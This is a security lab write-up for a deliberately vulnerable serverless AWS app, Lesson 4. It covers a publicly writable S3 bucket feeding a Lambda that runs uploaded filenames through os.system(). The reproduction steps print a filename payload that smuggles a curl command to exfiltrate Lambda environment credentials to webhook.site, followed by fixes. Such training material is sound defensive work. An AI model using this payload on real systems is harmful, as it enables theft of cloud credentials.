# Lesson 4 · Insecure Cloud Configuration

## Vulnerability Summary
The DVSA S3 receipts bucket is publicly writable. Any AWS user can upload files to it. The `send_receipt_email.py` Lambda, triggered by S3 upload events, passes the uploaded filename directly to `os.system()` **without sanitization**, enabling **command injection** and credential theft.

## Root Cause
Three misconfigurations combine:
1. **Permissive S3 ACL**: Bucket allows writes from any authenticated AWS account
2. **Block Public Access disabled**: Account-level safety guardrails are off
3. **Unsafe filename processing**: Lambda uses `os.system(filename)` without validation

## AWS Components
| Component | Role |
|-----------|------|
| S3 Bucket (dvsa-receipts-*) | Publicly writable storage |
| Lambda (send_receipt_email.py) | Triggered on `.raw` file uploads |
| CloudWatch Logs | Evidence of execution |
| Webhook.site | Attacker's credential exfiltration endpoint |

## Tools Used
- AWS CLI
- AWS CloudShell
- Secondary AWS attacker account

## Reproduction Steps

### Step 1 — Confirm the Misconfiguration
```bash
# From attacker AWS account
aws s3 cp test.txt s3://dvsa-receipts-bucket-<ACCOUNT_ID>-us-east-1/test.txt \
  --profile attacker-account
```
If the upload succeeds → bucket is publicly writable.

### Step 2 — Create the Malicious Filename
```bash
touch "$(echo -n 'normal_;curl https://webhook.site/YOUR_ID?keys=$(env|base64 --wrap=0)').raw"
```

### Step 3 — Upload to S3
```bash
aws s3 cp "malicious_filename.raw" \
  s3://dvsa-receipts-bucket-<ACCOUNT_ID>-us-east-1/2020/03/ \
  --profile attacker-account
```

### Step 4 — What Happens
1. File lands in S3 → triggers `send_receipt_email.py`
2. Lambda extracts the filename and calls `os.system(filename)`
3. Shell hits `;` separator → executes `curl ... $(env|base64 ...)`
4. All Lambda environment variables (including `AWS_ACCESS_KEY_ID`, `AWS_SECRET_ACCESS_KEY`, `AWS_SESSION_TOKEN`) are base64-encoded and sent to the webhook

### Step 5 — Decode the Stolen Credentials
```bash
echo "<base64_blob>" | base64 --decode
```

## Evidence
Webhook.site receives a GET request with a `keys` parameter containing base64-encoded Lambda environment variables including temporary AWS credentials.

## Fix Summary

**S3 — Block all public access:**
```bash
aws s3api put-public-access-block \
  --bucket dvsa-receipts-bucket-<ACCOUNT_ID>-us-east-1 \
  --public-access-block-configuration \
  "BlockPublicAcls=true,IgnorePublicAcls=true,BlockPublicPolicy=true,RestrictPublicBuckets=true"
```

**Lambda — Validate filename before use:**
```python
import re
SAFE_FILENAME = re.compile(r'^[a-zA-Z0-9_\-\.]+\.raw$')
if not SAFE_FILENAME.match(filename):
    raise ValueError(f"Rejected unsafe filename: {filename}")
```

See [`/Codefix/Lesson04-Insecure-Cloud-Configuration/`](../../Codefix/Lesson04-Insecure-Cloud-Configuration/) for full patched code.

## Lessons Learned
- **Never trust implicit data**: S3 filenames from event triggers are still untrusted user input
- **Defense in depth**: Storage misconfiguration + compute-layer validation must both be secured
- **Principle of least privilege**: Bucket policies and IAM roles must be strictly scoped
